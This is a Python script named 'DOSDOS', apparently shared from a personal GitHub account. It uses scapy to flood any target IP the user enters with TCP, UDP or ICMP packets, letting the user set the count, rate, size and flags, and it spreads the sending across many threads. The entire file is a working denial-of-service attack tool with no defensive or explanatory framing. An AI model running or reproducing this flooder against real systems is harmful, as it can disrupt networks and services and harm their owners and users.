import socket
from scapy.all import IP, TCP, UDP, ICMP, send
import time
import threading
from tqdm import tqdm
def check_ip_exists(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False
print('\33[1m'+'\33[101m' + "DOSDOS" + '\033[0m' + '\n')
print('\n'+'\033[91m' + "MADE BY : ", '\033[0m', '\33[5m'+'\33[32m' + "IMAN" + '\033[0m')
print('\33[4m'+'\33[104m' + "https://github.com/imanh2002" + '\033[0m' + '\n')
target_ip = input("Target IP: ")
if not check_ip_exists(target_ip):
    print("Invalid IP address. Exiting.")
    exit(1)
num_packets = int(input("Packets Number: "))
protocol = input("Protocol (TCP/UDP/ICMP): ").upper()
dport = int(input("Destination PORT: "))
if protocol == "TCP":
    flags = input("TCP Flags: ")
    packet = IP(dst=target_ip)/TCP(dport=dport, flags=flags)
elif protocol == "UDP":
    packet = IP(dst=target_ip)/UDP(dport=dport)
elif protocol == "ICMP":
    icmp_type = int(input("ICMP Type (0-255): "))
    icmp_code = int(input("ICMP Code (0-255): "))
    packet = IP(dst=target_ip)/ICMP(type=icmp_type, code=icmp_code)
else:
    print("Unsupported protocol. Exiting.")
    exit(1)
pps = int(input("Packets per second (PPS): "))
packet_size = int(input("Packet Size (bytes): "))
payload = "X" * (packet_size - len(packet))
def send_packets(packet, count, interval, progress_bar):
    try:
        for _ in range(count):
            send(packet/payload, verbose=False)
            time.sleep(interval)
            progress_bar.update(1)
    except KeyboardInterrupt:
        pass
packets_per_thread = num_packets // pps
remaining_packets = num_packets % pps
interval = 1.0 / pps
progress_bar = tqdm(total=num_packets, desc="Sending Packets", unit="pkt")
threads = []
try:
    for _ in range(pps):
        t = threading.Thread(target=send_packets, args=(packet, packets_per_thread, interval, progress_bar))
        threads.append(t)
        t.start()
    if remaining_packets > 0:
        send_packets(packet, remaining_packets, interval, progress_bar)
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\nAttack interrupted by user.")
finally:
    progress_bar.close()
    print('\n'+'\033[91m' + "SENT!" + '\033[0m')
